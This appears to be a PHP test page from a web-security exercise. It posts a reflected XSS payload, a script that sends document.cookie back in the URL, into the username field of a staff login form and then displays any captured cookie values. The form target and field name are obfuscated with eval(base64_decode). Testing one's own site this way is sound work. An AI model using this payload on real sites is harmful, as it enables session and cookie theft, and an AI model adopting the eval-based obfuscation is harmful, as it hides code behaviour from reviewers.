<?php
eval(base64_decode('ZnVuY3Rpb24gZWJkKCRhKXtlY2hvIGJhc2U2NF9kZWNvZGUoJGEpO30'));
$this_path = $_SERVER['SCRIPT_NAME'];
$string = "\" /><script>window.location = \"" . $this_path . "?cookie=\" + document.cookie;</script><br class=\"";
setcookie('XSS_test', 'Vulnerable', time()+60, '/');
?>

<!doctype html>
<html lang="en">
  <head>
    <title>XSS Test</title>
    <meta charset="utf-8">
  </head>
  <body>
    <a href="index.php">Test Menu</a><br />
    <br />
    <p>Click here to test your site for XSS vulnerability.</p>
    <p>If successful it will return cookie data.</p>
    <form action="<?php ebd('Li4vcHVibGljL3N0YWZmL2xvZ2luLnBocA=='); ?>" method="post">
      <input type="hidden" name="<?php ebd('dXNlcm5hbWU='); ?>" value='<?php echo $string; ?>' />
      <input type="submit" name="submit" value="Test XSS"  />
    </form>
    <br />
    <br />
    <?php
      if(isset($_GET['cookie'])) {
        echo "<div style=\"border: 2px solid red; color: red;\">";
        echo "Cookie data found: <br />";
        $values = explode(';', $_GET['cookie']);
        foreach($values as $value) {
          echo "{$value}<br />";
        }
        echo "</div>";
      }
    ?>
  </body>
</html>
